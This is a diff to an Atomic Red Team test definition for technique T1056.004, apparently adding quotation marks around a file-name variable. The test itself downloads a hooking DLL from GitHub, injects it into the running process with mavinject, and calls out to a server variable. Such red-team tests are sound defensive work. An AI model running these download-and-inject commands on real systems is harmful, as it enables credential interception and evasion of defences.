@@ -21,13 +21,13 @@ atomic_tests:
   - description: |
       T1056.004x64.dll must exist on disk at specified location (#{file_name})
     prereq_command: |
-      if (Test-Path #{file_name}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_name}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}" -UseBasicParsing
   executor:
     command: |
-      mavinject $pid /INJECTRUNNING #{file_name}
+      mavinject $pid /INJECTRUNNING "#{file_name}"
       Invoke-WebRequest #{server_name} -UseBasicParsing
     name: powershell
     elevation_required: true
